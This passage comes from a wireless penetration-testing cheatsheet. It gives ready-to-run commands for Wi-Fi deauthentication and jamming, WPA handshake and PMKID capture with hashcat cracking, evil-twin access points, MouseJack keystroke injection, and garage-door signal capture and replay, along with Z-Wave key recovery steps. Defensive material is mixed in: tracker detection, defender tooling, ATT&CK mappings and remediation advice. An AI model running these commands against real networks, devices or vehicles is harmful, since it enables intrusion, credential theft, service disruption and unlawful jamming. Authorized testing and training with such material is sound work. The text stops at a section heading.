# US/Canada: 908.42 MHz
# Europe: 868.42 MHz
# Other regions vary

# === SCAPY-RADIO (Z-Wave packet crafting) ===
# With HackRF:
# Capture Z-Wave packets at 908.42MHz
hackrf_transfer -r zwave_capture.raw -f 908420000 -s 2000000

# === EZ-WAVE (Z-Wave exploitation) ===
git clone https://github.com/cureHsu/EZ-Wave.git
# Scan for Z-Wave devices
# Replay captured commands (locks, lights, etc.)

# === Z-WAVE SECURITY CLASSES ===
# S0: Known vulnerability — key exchange uses temp key of all zeros
# S2: Stronger, but implementation issues exist
# No security: Many older devices have no encryption at all

# S0 key recovery:
# Capture S0 key exchange during device inclusion
# Temp key = 0x00 * 16 → derive network key
# Decrypt all traffic with recovered key
```

### 6.3 Other RF-Layer IoT Protocols

```bash
# Scope note: This section covers the RF / radio layer for IoT
# protocols. Once an IoT device is on IP and reachable over the
# network, application-layer attacks (MQTT broker abuse, CoAP
# enumeration, REST API exploitation) belong in the web / lateral
# movement cheatsheets — not RF scope.

# === LORA / LoRaWAN (Long Range, Low Power) ===
# Frequencies: 868MHz (EU), 915MHz (US), 433MHz (Asia)
# Capture with HackRF or dedicated LoRa module:
# gr-lora (GNU Radio LoRa decoder):
git clone https://github.com/rpp0/gr-lora.git
# Build and use with GNU Radio
# LoRaWAN security: AppKey + NwkKey at provisioning; recovery vectors
# include CVE-2024-29862 (LoRaWAN root key recovery in some impls)

# === THREAD / MATTER (RF-layer only) ===
# Newer IoT mesh protocols built on 802.15.4 (same physical layer
# as Zigbee). Operating bands: 2.4 GHz (channels 11-26).
# RF-layer attack surface similar to Zigbee:
# - Sniffing 802.15.4 frames (KillerBee, Sniffle with appropriate fw)
# - Channel jamming (mdk4-equivalent for 802.15.4)
# - Network-key extraction during commissioning (analogous to Zigbee
#   key sniffing during pairing)
# Thread + Matter add stronger commissioning crypto + per-device
# certificates — most legacy Zigbee primitives mitigated at protocol
# layer; bug class shifts to implementation flaws + commissioning UX

# === DECT (Cordless Phone) ===
# Frequency: 1.88-1.9 GHz (EU), 1.92-1.93 GHz (US)
# Legacy DECT phones still found in some enterprises (warehouses,
# manufacturing, hotels). DECT Standard Cipher (DSC) cryptanalyzed
# by deDECTed.org research (~2009-2014); residual against legacy
# DECT installations.
# Tools: dedected.org / OsmocomDECT (last meaningful work ~2018,
# but DECT itself unchanged → still applicable to legacy targets)
```

---

## PHASE 7 — WIRELESS JAMMING & RF DENIAL OF SERVICE

```bash
# === LEGAL WARNING ===
# RF jamming is ILLEGAL in most jurisdictions without explicit authorization
# FCC (US), Ofcom (UK), and equivalents strictly prohibit jamming
# Only perform in Faraday cages or with written authorization

# === WI-FI JAMMING ===
# Continuous deauthentication (Layer 2):
sudo mdk4 wlan0mon d                  # Deauth everything in range
sudo mdk4 wlan0mon d -B <AP_MAC>     # Target specific AP

# Channel flood:
sudo mdk4 wlan0mon b -a -w nta       # Beacon flood with random SSIDs

# === RF JAMMING (SDR) ===
# Generate noise on specific frequency:
# GNU Radio: Noise Source → osmocom Sink
# Set center frequency to target
# CAUTION: Broadband jamming affects everything including emergency services

# === BLUETOOTH JAMMING ===
# BLE advertisement flooding:
# Flood BLE advertisements to prevent legitimate pairing
# Using hcitool or custom BLE tools

# === DETECTION OF UNAUTHORIZED JAMMING ===
# Spectrum analysis to identify interference:
hackrf_sweep -f 2400:2500 -w 100000  # Sweep 2.4GHz Wi-Fi band
# Sudden broadband noise = jamming
# Narrowband interference = specific device issue
```

---

## PHASE 8 — SPECIALIZED WIRELESS ATTACKS

### 8.1 MouseJack (Wireless Keyboard/Mouse Attacks)

```bash
# === HARDWARE: CrazyRadio PA or nRF52840 ===
# Targets wireless keyboards/mice using nRF24L01+ chipsets
# Affects: Logitech, Dell, HP, Microsoft, Lenovo, and others

# Install JackIt:
git clone https://github.com/insecurityofthings/jackit.git
cd jackit && pip install -e .

# Scan for vulnerable devices:
jackit --scan

# Inject keystrokes:
jackit --address <DEVICE_ADDR> --vendor logitech

# MouseJack with Crazyradio PA:
# Flash research firmware:
git clone https://github.com/BastilleResearch/mousejack.git
cd mousejack && make

# Scan:
./nrf24-scanner.py

# Inject:
./nrf24-injector.py --address <ADDR> --payload ducky_script.txt

# === LOGITECH UNIFYING RECEIVER ===
# Extract crypto keys:
# Requires brief physical access to receiver
# munifying tool:
git clone https://github.com/RoganDawes/munifying.git
# Dump encryption keys from receiver
# Use keys to decrypt all keyboard traffic
```

### 8.2 Wireless Surveillance & TSCM

```bash
# === DETECT HIDDEN WIRELESS CAMERAS ===
# Scan for devices on 2.4/5GHz:
sudo airodump-ng wlan0mon
# Look for: camera manufacturer MACs, unusual devices

# Scan for analog video transmitters:
# Use RTL-SDR or HackRF to sweep common frequencies:
# 900MHz, 1.2GHz, 2.4GHz, 5.8GHz
hackrf_sweep -f 900:6000 -w 1000000

# === DETECT HIDDEN BLUETOOTH DEVICES ===
hcitool scan                           # Discoverable
sudo hcitool lescan --duplicates       # BLE (hidden trackers)
# Look for: AirTags, Tile, SmartTag, unknown BLE devices

# ★ AIRTAG / TILE / SMARTTAG STALKERWARE DETECTION (G18) ★
# Personal-safety / TSCM operationally important. Hidden trackers
# beacon on persistent intervals; with the right tooling, they
# can be detected in vehicle / luggage / personal effects.
#
# === Apple AirTag (Find My network) ===
# - Broadcasts every 2 seconds when separated from owner
# - Public Apple ID (rotates ~15 minutes for owner privacy)
# - Service UUID: 0xFD6F (Apple Find My Network)
# Detect on iOS: Settings → Privacy → Tracking → "Tracker Detect"
# Detect on Android: Apple "Tracker Detect" app (released Dec 2021)
# OR AirGuard (open source — most thorough):
#   https://github.com/seemoo-lab/AirGuard
#   Detects AirTag + Find My network items (3rd-party Find My-compatible
#   trackers) + Tile + SmartTag in single scan
#
# === Tile ===
# - Service UUID: 0xFEED
# - Broadcasts every ~6-10 seconds (configurable)
# - Detect on Android: Tile's own "Scan and Secure" feature (in app)
#   Or AirGuard (above)
#
# === Samsung Galaxy SmartTag / SmartTag2 ===
# - Service UUID: 0xFD5A (Samsung-specific)
# - Detect on Galaxy: SmartThings app native "Find unknown trackers"
# - Detect on iOS: "Galaxy SmartTag Detector" (Samsung-released 2024)
# - Detect cross-platform: AirGuard (Q1 2024+ added SmartTag support)
#
# === Operator passive scan (Linux) ===
sudo bluetoothctl
> menu scan
> transport le
> back
> scan on
# Watch for service UUIDs 0xFD6F, 0xFEED, 0xFD5A in advertisements
# Or with Sniffle (NCC Group BLE 5 sniffer) for full advertisement
# logging:
sniff_receiver.py -i 0 -c 37 -o tracker_scan.pcap
# Filter in Wireshark: btatt.uuid16 in {0xFD6F,0xFEED,0xFD5A}
#
# === Indicators of stalkerware (vs legitimate device near you) ===
# - Same tracker MAC follows you across multiple locations + days
# - Tracker not associated with any device you own
# - AirGuard "moving with you" alert fires
# - High RSSI from tracker in confined personal space (luggage,
#   vehicle, personal bag) — RSSI > -60 dBm typical for hidden
#   in luggage; > -50 dBm typical for in-vehicle

# === RF BUG DETECTION ===
# Spectrum sweep for unexpected transmissions:
# Use SDR to sweep 1MHz-6GHz
# Look for: constant transmitters, burst transmissions
# Near-field probing with directional antenna

# === WIRELESS KEYSTROKE INTERCEPTION ===
# Ubertooth + keyboard sniffing:
# If target uses Bluetooth keyboard
ubertooth-btle -f -t <KEYBOARD_ADDR>
# Decode HID reports from captured BLE traffic
```

### 8.3 Car Key / Garage Door RF Attacks

```bash
# === IDENTIFY FREQUENCY ===
# Common frequencies:
# 315 MHz (US), 433.92 MHz (EU), 868 MHz (EU newer)
# Use SDR to identify:
gqrx                                  # Visual spectrum while pressing remote

# === FIXED CODE SYSTEMS (Older) ===
# Capture with HackRF:
hackrf_transfer -r garage.raw -f 315000000 -s 2000000
# Replay:
hackrf_transfer -t garage.raw -f 315000000 -s 2000000 -x 30

# Flipper Zero: Sub-GHz → Read RAW → Emulate/Send

# === ANALYZE WITH URH ===
urh
# Record signal → auto-detect modulation
# Identify bit pattern → replay or modify

# === ROLLING CODE SYSTEMS ===
# Modern systems resist simple replay
# RollJam concept (research only):
# Requires simultaneous jam + capture
# See Samy Kamkar's RollJam research

# === RELAY ATTACKS (Keyless Entry) ===
# Extend range of key fob signal to unlock/start car
# Device 1: Near car (amplifies signal seeking key)
# Device 2: Near key fob (captures and relays response)
# Result: Car thinks key is nearby
# Requires specialized hardware (not covered in detail)
```

---

## PHASE 9 — REPORTING & EVIDENCE

### 9.1 Evidence Collection

```bash
# === PACKET CAPTURES ===
# Save all wireless captures in pcapng format
# Organize by: date, target, attack_type

# === SCREENSHOTS ===
# Document every successful attack:
# - Cracked passwords
# - Evil twin connections
# - Data interception
# - Access gained

# === AUTOMATED REPORTING ===
# Wifite generates log files automatically
# Kismet exports to KML for mapping
# Bettercap logs all events

# === SIGNAL ANALYSIS EVIDENCE ===
# Save URH project files
# Export spectrum screenshots from GQRX
# Save IQ captures for reproduction

# Convert pcap for analysis:
tshark -r capture.pcap -T fields \
  -e frame.time -e wlan.sa -e wlan.da -e wlan.ssid \
  -E header=y -E separator=, > wireless_activity.csv
```

### 9.2 Report Structure

```
1. Executive Summary
   - Scope (SSIDs, frequencies, physical locations)
   - Overall wireless security posture rating
   - Critical findings overview
   - Business impact assessment

2. Methodology
   - Standards: OWASP Wireless Testing Guide, NIST SP 800-153
   - Testing approach (passive/active/social engineering)
   - Hardware and software used
   - Duration and physical locations tested

3. Findings (per finding)
   - Title & Severity (Critical/High/Medium/Low/Info)
   - CVSS 3.1 Score
   - Affected systems/SSIDs/devices
   - Description
   - Steps to reproduce (with screenshots & commands)
   - Evidence (captures, screenshots, cracked credentials)
   - Impact (technical + business)
   - Remediation

4. Wireless Coverage Map
   - Physical layout with AP locations
   - Signal strength heat map
   - Rogue AP locations discovered
   - BLE/Zigbee device locations

5. Remediation Recommendations (Prioritized)
   Immediate:
   - Disable WEP/WPA networks
   - Disable WPS
   - Change default/weak credentials
   Short-term:
   - Deploy WPA3 (without transition mode)
   - Implement 802.1X with certificate validation
   - Enable PMF (Protected Management Frames)
   - Segment wireless networks (guest/corp/IoT)
   - Deploy WIDS/WIPS
   Strategic:
   - Implement NAC (Network Access Control)
   - Regular wireless assessments
   - Employee security awareness (evil twin)
   - IoT device inventory and hardening

6. Appendices
   - Full scan results
   - Packet captures
   - Cracked credential list (redacted)
   - Signal analysis data
   - Tool versions and configurations
```

---

## 10 — TOOL QUICK REFERENCE (MAINTENANCE STATUS)

> **Legend:** ✅ Active (commits within 6 months) — ⚠ Stalled (6–18 months silent) — ❌ Dead (>18 months silent or archived) — $ Paid / commercial — ◆ Vendor-provided / hardware-bundled

```
═══════════════════════════════════════════════════════════
WI-FI ATTACK TOOLING
═══════════════════════════════════════════════════════════
✅ aircrack-ng suite       https://github.com/aircrack-ng/aircrack-ng
   airodump-ng / aireplay-ng / aircrack-ng / airmon-ng
✅ hcxdumptool / hcxtools  https://github.com/ZerBea/hcxdumptool
   PMKID + handshake capture; ZerBea-maintained
✅ hashcat                 https://github.com/hashcat/hashcat
   GPU password cracking; modes 22000 (WPA), 16800 (PMKID legacy),
   5500 (NetNTLM), 27200 (WPA cohash)
✅ wifite                  https://github.com/derv82/wifite2
   Automated WPA/WPS attacks; active fork
✅ kismet                  https://www.kismetwireless.net
   Multi-protocol passive scanner; active maintenance
✅ bettercap               https://github.com/bettercap/bettercap
   Multi-protocol attack framework
✅ EAPHammer                https://github.com/s0lst1c3/eaphammer
   WPA-Enterprise attacks; PRIMARY for Enterprise
✅ wifipumpkin3            https://github.com/P0cL4bs/wifipumpkin3
   Rogue AP framework
✅ Fluxion                 https://github.com/FluxionNetwork/fluxion
   Social engineering Wi-Fi (captive portal evil twin)
✅ NetExec (nxc)           https://github.com/Pennyw0rth/NetExec
   Cross-ref lateral cheatsheet — useful post-Wi-Fi-foothold
⚠ hostapd-wpe              https://github.com/OpenSecurityResearch/hostapd-wpe
   Stalled ~2018; broken on modern Kali — use eaphammer
⚠ reaver / bully (WPS)     Functional but PixieWPS degraded against
                            modern routers (see §2.5 caveat)
⚠ asleap                   Functional but LEAP largely retired
✅ ESP32 Marauder          https://github.com/justcallmekoko/ESP32Marauder
   $10 WiFi/BT attack platform
$ WiFi Pineapple Mark VII  Hak5 — superseded by Mark VII NEO + Enterprise
$ Pineapple Mark VII NEO   Hak5 — Wi-Fi 6 capable
$ Pineapple Enterprise     Hak5 — operator-grade (2025)

═══════════════════════════════════════════════════════════
BLUETOOTH / BLE TOOLING
═══════════════════════════════════════════════════════════
✅ BlueZ stack              Linux Bluetooth stack — bluetoothctl, hcitool,
                            btmon, gatttool
✅ Bleak (Python)           https://github.com/hbldh/bleak
   Modern asyncio BLE — PRIMARY 2026
✅ simplepyble              https://github.com/OpenBluetoothToolbox/SimplePyBLE
   Cross-platform BLE alternative to Bleak
✅ Sniffle (NCC Group)     https://github.com/nccgroup/Sniffle
   Best-in-class BLE 5+ sniffer (TI CC1352-based hardware)
✅ btlejack                 https://github.com/virtualabs/btlejack
   Micro:bit-based BLE sniffer + jam + reconnect
✅ AirGuard                 https://github.com/seemoo-lab/AirGuard
   AirTag / Tile / SmartTag detection — Android
✅ apple_bleee              https://github.com/hexway/apple_bleee
   Apple Continuity / AirDrop reconnaissance (Hexway)
✅ ubertooth                Great Scott Gadgets — passive BT sniffing
✅ Crackle                  https://github.com/mikeryan/crackle
   BLE legacy pairing crack — last commit 2014 ⚠ but still functional
❌ BluePy                   pip install bluepy — last release 2020;
                            no Python 3.12+ wheels; broken on modern Kali
❌ BlueHydra                pwnieexpress/blue_hydra — Pwnie Express defunct;
                            archived; Ruby dependency hell
⚠ GATTacker                ~2018; abandoned; use Sniffle + bleak bridge
❌ BTLE-Juice               ~2017; abandoned; use modern alternatives

═══════════════════════════════════════════════════════════
RFID / NFC TOOLING
═══════════════════════════════════════════════════════════
✅ Proxmark3 RDV4          https://github.com/RfidResearchGroup/proxmark3
   Iceman-fork actively maintained (2024-2026)
✅ Chameleon Ultra          https://github.com/RfidResearchGroup/ChameleonUltra
   RFID emulation
✅ Flipper Zero firmware    Multi-protocol; xtreme-firmware (community fork)
                            extends RFID/NFC capabilities
✅ libnfc                   Long-running NFC library
✅ MFOC / MFCUK             MIFARE Classic offline crackers
✅ NFCGate (Android)        NFC relay attack app — community-maintained

═══════════════════════════════════════════════════════════
SDR / RF TOOLING
═══════════════════════════════════════════════════════════
✅ HackRF One / Portapack  Great Scott Gadgets / OpenSourceSDRLab
                            HackRF firmware actively maintained;
                            Mayhem firmware for Portapack (community)
✅ RTL-SDR (v3 / v4)       Receive-only; v4 requires updated drivers
✅ Yard Stick One          Great Scott Gadgets — Sub-GHz TX/RX (rfcat)
✅ GNU Radio                https://www.gnuradio.org
   Signal processing; GR 3.10 current
✅ GQRX / SDR# / SDR++      Spectrum analyzers
✅ inspectrum               Visual signal analysis
✅ Universal Radio Hacker  https://github.com/jopohl/urh
   Auto-modulation detection + signal generation
✅ rtl_433                 https://github.com/merbanan/rtl_433
   200+ IoT protocol decoders
✅ gr-lora                  https://github.com/rpp0/gr-lora
✅ gps-sdr-sim              https://github.com/osqzss/gps-sdr-sim
   GPS spoofing (RINEX file required from NASA CDDIS — auth required 2021+)
✅ srsRAN                  https://github.com/srsran/srsRAN_Project
   Open-source 4G/5G RAN
✅ Open5GS                 https://open5gs.org
   Open-source 5G core
⚠ Crocodile Hunter         EFF — last commit ~2022 (4G focused)
⚠ kal (kalibrate-rtl)      Functional but RTL-SDR-only

═══════════════════════════════════════════════════════════
ZIGBEE / Z-WAVE / IOT
═══════════════════════════════════════════════════════════
✅ KillerBee               https://github.com/riverloopsec/killerbee
   riverloopsec fork — active 2024
✅ Z3sec                   ZigBee Touchlink attacks
✅ zbstumbler / zbdump     KillerBee suite tools
⚠ EZ-Wave                  ~2017; functional but stalled
✅ Sniffle (also Zigbee)   With appropriate firmware

═══════════════════════════════════════════════════════════
HARDWARE (OPERATOR-GRADE)
═══════════════════════════════════════════════════════════
✅ Alfa AWUS036ACH/ACS     Wi-Fi monitor/inject 2.4/5 GHz
✅ Alfa AWUS036AXML        Wi-Fi 6E (6 GHz)
✅ Alfa AWUS036AXER        Wi-Fi 7 (802.11be)
✅ Sonoff CC1352P2-2 dongle Sniffle / BLE 5 / Zigbee
✅ HackRF One              SDR 1MHz-6GHz TX/RX
✅ Portapack H4M (Mayhem)  Standalone HackRF
✅ Proxmark3 RDV4          RFID/NFC
✅ Flipper Zero            Multi-protocol
✅ ESP32 Marauder boards   $10 platform; M5StickC Plus2, Cardputer, etc.
✅ Crazyradio PA           MouseJack / nRF24
✅ BBC Micro:bit (v2)      btlejack (BLE sniff/jam)
✅ TI CC1352P2 (Sonoff)    Sniffle BLE5 + Zigbee
$ WiFi Coconut             ROGAdvent — multi-radio Wi-Fi sniffer

═══════════════════════════════════════════════════════════
DEAD / DEPRECATED — DO NOT RELY ON IN 2026
═══════════════════════════════════════════════════════════
❌ BluePy                  pip install bluepy — use Bleak
❌ BlueHydra                pwnieexpress — defunct; use Kismet + bettercap
❌ BTLE-Juice               npm btlejuice — abandoned ~2017
❌ Aireplay-ng -3 chopchop WEP-only; WEP itself is rare in 2026
❌ Hot Potato (CS)          Pre-2019 WPA; superseded by PMKID + handshake
❌ pwd_extractor (legacy)  Use modern alternatives
❌ MimiPenguin (Linux)     Kernel-side mitigations make obsolete
❌ Stockholm WAR-driving    Pre-MAC-randomization era research; conceptually
                            obsolete vs modern smartphone fleets
❌ wpe.py / hostapd-wpe    Use eaphammer or berate_ap
❌ AirCrack/CommView legacy Replaced by aircrack-ng
```

---

## 11 — DEFENDER STACK REFERENCE (Wireless)

```
═══════════════════════════════════════════════════════════
WHAT EACH DEFENDER PRODUCT SEES (WIRELESS ENGAGEMENT)
═══════════════════════════════════════════════════════════

WIDS / WIPS (Wireless Intrusion Detection / Prevention):

  Cisco DNA Center / Catalyst 9800 controllers
    Sees: Rogue AP, evil twin (matching SSID different BSSID),
    deauth flood, beacon spoofing, KARMA-class probe responder,
    auth flood, MAC spoofing patterns; AI-driven anomaly detection
    in DNA Spaces (cloud-side) layer
  Aruba ClearPass + Aruba Central (HPE)
    Sees: Same as Cisco; ClearPass NAC catches device posture
    anomalies on join; Central cloud-side correlates across
    multi-site deployments
  Mist AI (Juniper) — formerly Mist Systems
    AI-driven WLAN; ML-based anomaly detection on RF + client
    behavior; rogue AP localization via Bluetooth array (Mist
    BT11 access point)
  Meraki Air Marshal (Cisco Meraki)
    Cloud-managed WIDS; sees rogue AP, evil twin (with
    "matching AP" warning), spoofed BSSID, deauth flood
  Ruckus / CommScope SmartZone
    Carrier-grade WLAN; rogue containment via deauth response
  Extreme Networks ExtremeCloud IQ
    Cloud-side WIDS + analytics

  HOMEGROWN / OPEN SOURCE:
  Kismet (also operator tool)
    Powerful passive WIDS in defensive role; rogue AP detection,
    probe request anomaly, BSSID spoof detection
  Wireless Defense Toolkit (WDT)
    Limited adoption; research-grade

ENDPOINT-SIDE WIRELESS TELEMETRY:
  Microsoft Defender for Endpoint (MDE)
    Sees: Wi-Fi connection events, rogue AP connection (KARMA-style)
    via "Suspicious Wi-Fi network" detection; SSID change patterns
  CrowdStrike Falcon
    Wi-Fi connection events; MITM detection patterns
  SentinelOne Singularity
    Same primitives + Storyline graph
  Microsoft Intune (mobile + Win)
    Wi-Fi profile compliance check; flags non-corporate-SSID joins
    on managed devices
  Apple JAMF Pro / Apple Configurator
    macOS / iOS Wi-Fi profile management; AWDL anomaly detection
    (limited Q4 2024+)

CLOUD-SIDE / IDENTITY:
  Cisco Spaces (formerly DNA Spaces)
    Cloud-side analytics on Cisco AP fleet; detects anomalous
    device patterns + rogue infrastructure across multi-site
  Aruba Central
    Equivalent for Aruba/HPE
  Juniper Mist Cloud
    Equivalent for Mist
  Microsoft Defender for Cloud Apps (MDCA) — partial role
    Detects post-Wi-Fi-foothold cloud session anomalies (PRT replay,
    new IP after Wi-Fi compromise, etc.)
  Entra ID Conditional Access + Identity Protection
    Network-condition-based CA policies (corporate-network-only
    enforcement) — Wi-Fi access control via identity layer

WIRELESS PROTOCOL ANALYSIS:
  Zeek / Suricata / Corelight
    802.11 protocol parsing, deauth flood, beacon anomaly,
    KARMA-class probe-response detection (RF protocol layer)

WIRELESS SPECIFIC (SDR-AWARE):
  Bastille Networks (commercial)
    RF spectrum monitoring across IoT/Wi-Fi/BT bands
  CTF / 802.11-Auditor (research)
    Real-time channel scan + anomaly visualization

OPERATIONAL DETECTION GAPS (operator advantage):
- 6 GHz / Wi-Fi 7 monitoring still maturing — many WIDS deployed
  pre-2024 cannot fully scan 320 MHz channels
- BLE / IoT spectrum monitoring rare outside Bastille / Mist
- Sub-GHz (RF / car key / SCADA radio) monitoring practically
  nonexistent in standard enterprise — operator stealth advantage
- Cellular / IMSI catcher detection consumer-side only (SnoopSnitch,
  CellGuard) — enterprise-side detection requires telecom partnership
- AWDL / Apple Continuity not natively monitored by most WIDS
```

---

## 12 — MITRE ATT&CK MAPPING MATRIX

> **Tactic coverage:** Primarily TA0001 (Initial Access via wireless), TA0040 (Impact via wireless DoS), TA0011 (C2 over alt medium); secondary TA0006 (Credential Access), TA0007 (Discovery), TA0009 (Collection). Mapping reflects ATT&CK v15 (October 2024) + v16 enterprise update (April 2026) + Mobile/ICS matrices where relevant.

```
═══════════════════════════════════════════════════════════
WIRELESS-RELEVANT ENTERPRISE ATT&CK TECHNIQUES (RF-LAYER ONLY)
═══════════════════════════════════════════════════════════
T1011    Exfiltration Over Other Network Medium
T1011.001 Exfiltration Over Bluetooth                  (§3 BLE channels)
T1040    Network Sniffing                              (§1.1 RF capture /
                                                          §3 BT / §4 RFID)
T1095    Non-Application Layer Protocol                (§5 SDR / §6 Zigbee /
                                                          Thread/Matter
                                                          radio layer)
T1110    Brute Force                                   (§2.2 PMKID/handshake)
T1110.001 Password Guessing                            (§2.4 MSCHAPv2 capture)
T1119    Automation Collection                         (kismet / wifite RF)
T1187    Forced Authentication                         (§2.6 evil-twin /
                                                          KARMA RF probe-resp)
T1200    Hardware Additions                            (§0.1 RF hardware
                                                          drop-in / ESP32)
T1421    System Network Configuration Discovery        (§1 RF recon)
T1456    Drive-by Compromise                           (§2.6 evil twin SSID)
T1557    Adversary-in-the-Middle (RF-layer only)       (§2.6 evil twin /
                                                          §3.2 BLE MITM /
                                                          §17.3 NetScaler-
                                                          adjacent BLE)
T1565    Data Manipulation                             (§3 BLE write /
                                                          §4.4 car key replay)

═══════════════════════════════════════════════════════════
MOBILE ATT&CK (Wi-Fi / BT / cellular relevant)
═══════════════════════════════════════════════════════════
T1379    Exploit via Network Carrier                   (IMSI catcher / 5G NSA)
T1414    Capture Clipboard Data                        (post-MITM)
T1428    Exploit Enterprise Resources                  (post-evil-twin auth)
T1430    Location Tracking                             (BLE tracker / AWDL recon)
T1438    Eavesdrop on Insecure Network Communication   (§2 / §3)
T1452    Manipulate App Store Rankings or Ratings      (NFC NDEF malicious URL)

═══════════════════════════════════════════════════════════
ICS/OT ATT&CK (where wireless touches OT)
═══════════════════════════════════════════════════════════
T0830    Adversary-in-the-Middle                       (§5 SDR replay against
                                                         SCADA / RF sensors)
T0857    Communication Authenticity                    (§5 RF spoof)
T0860    Wireless Compromise                           (§2 / §6 IoT)

═══════════════════════════════════════════════════════════
WIRELESS-SPECIFIC MAPPINGS
═══════════════════════════════════════════════════════════
[Wi-Fi]
  WEP / WPA / WPA2 cracking         → T1110 (Brute Force)
  PMKID / Handshake capture         → T1040 (Network Sniffing)
  Evil Twin                         → T1557 (AiTM) + T1187 (Forced Auth)
  WPA-Enterprise cred capture       → T1110.001 (Password Guessing)
  WPS Pixie Dust                    → T1110 (Brute Force)
  Deauth attacks                    → T1499 (Endpoint DoS)
  BlastRADIUS (CVE-2024-3596)       → T1557 (AiTM) + T1556 (Modify Auth)

[Bluetooth]
  Bluejacking / Bluesnarfing        → T1040 (Sniffing) + T1530 (Data
                                       from Cloud) — context-dependent
  BIAS (CVE-2020-10135)             → T1556 (Modify Authentication Process)
  BlueBorne                         → T1210 (Exploitation of Remote Services)
  AirDrop spam / phantom AirTag     → T1499 (Endpoint DoS)
  AWDL Project Zero RCE             → T1210 (Exploitation of Remote Services)
  BLE Replay                        → T1499 / T1565 (Data Manipulation)

[RFID / NFC]
  Card cloning                      → T1078 (Valid Accounts) +
                                       T1556 (Modify Auth Process)
  NFC NDEF malicious URL            → T1204.001 (User Execution: Link)
  Proxmark3 LF/HF capture           → T1040 (Network Sniffing)

[SDR / RF]
  Replay attacks (315/433MHz)       → T0830 (AiTM, ICS) + T1565
  GPS spoofing                      → T1565.001 (Stored Data Manipulation)
  GSM IMSI capture                  → T1379 (Mobile — Exploit via Carrier)
  5G SA SUCI (mitigated)            → N/A in v16 — emerging

[IoT]
  Zigbee key extraction             → T1110 (Brute Force) +
                                       T1040 (Network Sniffing)
  Z-Wave S0 inclusion abuse         → T1110 + T1556 (Modify Auth)
  MQTT unauth                       → T1078 (Valid Accounts — default creds)
  CoAP unauth                       → T1190 (Exploit Public-Facing App)

[Automotive]
  RollBack / RollJam                → T1565 (Data Manipulation)
  Tesla BLE Relay                   → T1556 + T1078
  KIA Boys CAN injection            → T0859 (Valid Accounts, ICS)

[Stalkerware Detection — defensive]
  AirTag / Tile / SmartTag          → T1430 (Mobile — Location Tracking)
                                       reverse: defender-side detection
```

---

## 13 — QUICK REFERENCE TABLES

### Common Wireless Frequencies

```
┌─────────────────────────────────────────────────────────┐
│ PROTOCOL          │ FREQUENCY           │ RANGE         │
├─────────────────────────────────────────────────────────┤
│ Wi-Fi 2.4GHz      │ 2.400 - 2.4835 GHz │ ~50-100m      │
│ Wi-Fi 5GHz        │ 5.150 - 5.850 GHz  │ ~30-50m       │
│ Wi-Fi 6GHz (6E)   │ 5.925 - 7.125 GHz  │ ~20-40m       │
│ Bluetooth Classic │ 2.402 - 2.480 GHz  │ ~10-100m      │
│ BLE               │ 2.402 - 2.480 GHz  │ ~10-50m       │
│ Zigbee            │ 2.405 - 2.480 GHz  │ ~10-100m      │
│ Z-Wave (US)       │ 908.42 MHz         │ ~30-100m      │
│ Z-Wave (EU)       │ 868.42 MHz         │ ~30-100m      │
│ LoRa              │ 433/868/915 MHz    │ ~2-15km       │
│ LF RFID           │ 125 - 134 kHz      │ ~1-10cm       │
│ HF RFID/NFC       │ 13.56 MHz          │ ~1-10cm       │
│ UHF RFID          │ 860 - 960 MHz      │ ~1-12m        │
│ Car key (US)      │ 315 MHz            │ ~10-50m       │
│ Car key (EU)      │ 433.92 MHz         │ ~10-50m       │
│ Garage door       │ 300-400 MHz        │ ~10-50m       │
│ DECT (EU)         │ 1.88 - 1.9 GHz     │ ~50-300m      │
│ DECT (US)         │ 1.92 - 1.93 GHz    │ ~50-300m      │
│ GSM 900           │ 890 - 960 MHz      │ ~35km         │
│ GSM 1800          │ 1710 - 1880 MHz    │ ~8km          │
│ LTE (various)     │ 700-2600 MHz       │ ~1-30km       │
│ 5G FR1 (sub-6)    │ 600-6000 MHz       │ ~1-10km       │
│ 5G FR2 (mmWave)   │ 24-100 GHz         │ ~100-500m     │
│ GPS L1            │ 1575.42 MHz        │ Satellite     │
│ ADS-B (Aviation)  │ 1090 MHz           │ ~400km        │
│ FRS/GMRS Radio    │ 462-467 MHz        │ ~3-30km       │
│ nRF24L01+ (Mouse) │ 2.400 - 2.525 GHz │ ~10-100m      │
│ UWB (Apple U1)    │ 6.25-8.25 GHz      │ ~10-30m       │
└─────────────────────────────────────────────────────────┘
```

### Wi-Fi Encryption Quick Reference (Q1-Q2 2026)

```
┌────────────────────────────────────────────────────────────────────────┐
│ TYPE              │ STATUS     │ PRIMARY 2026 ATTACK         │ TIME   │
├────────────────────────────────────────────────────────────────────────┤
│ Open              │ Insecure   │ Direct sniffing             │ 0      │
│ WEP               │ Broken     │ IV collection + crack       │ Min    │
│ WPA-TKIP          │ Weak       │ Handshake + dictionary      │ Varies │
│ WPA2-PSK          │ Standard   │ PMKID/Handshake + hashcat   │ Varies │
│ WPA2-Enterprise   │ Strong*    │ Evil twin + MSCHAPv2 cap    │ Hours  │
│ WPA3-SAE          │ Strong     │ Transition downgrade / SE / │ Hard   │
│                   │            │   EvilWP3 (research)        │        │
│ WPA3-Enterprise   │ Strongest  │ Cert theft (EAP-TLS-only) / │ V.Hard │
│                   │            │   Social engineering        │        │
│ OWE               │ Good       │ SSID-pinning / OWE Trans    │ Hard   │
│                   │            │   downgrade / Evil twin     │        │
│ WPA3 6 GHz only   │ Strongest  │ Social engineering only —   │ V.Hard │
│                   │            │   PMF blocks deauth attacks │        │
│ Wi-Fi 7 (MLO)     │ Inherits   │ MLO downgrade to weaker     │ Varies │
│                   │  config    │   band; CVE-2024-30078 RCE  │        │
└────────────────────────────────────────────────────────────────────────┘
* If certificate validation enforced on clients
```

### Essential RF One-Liners

```bash
# Quick handshake capture + crack (RF capture → offline crack)
sudo wifite --wpa --kill --dict /usr/share/wordlists/rockyou.txt

# PMKID capture (clientless — pure RF)
sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15 && hcxpcapngtool -o hash.hc22000 dump.pcapng && hashcat -m 22000 hash.hc22000 rockyou.txt

# Quick evil twin (RF side only — post-association MITM is layer-7
# and lives in lateral / web cheatsheets)
sudo bettercap -iface wlan0 -eval "set wifi.ap.ssid FreeWiFi; set wifi.ap.channel 6; wifi.ap on"

# Deauth + capture (RF capture)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon & sleep 5 && sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# BLE quick recon (RF advertisement scan)
sudo bettercap -eval "ble.recon on" -iface hci0

# RFID quick clone (Proxmark3 — RFID/HF radio)
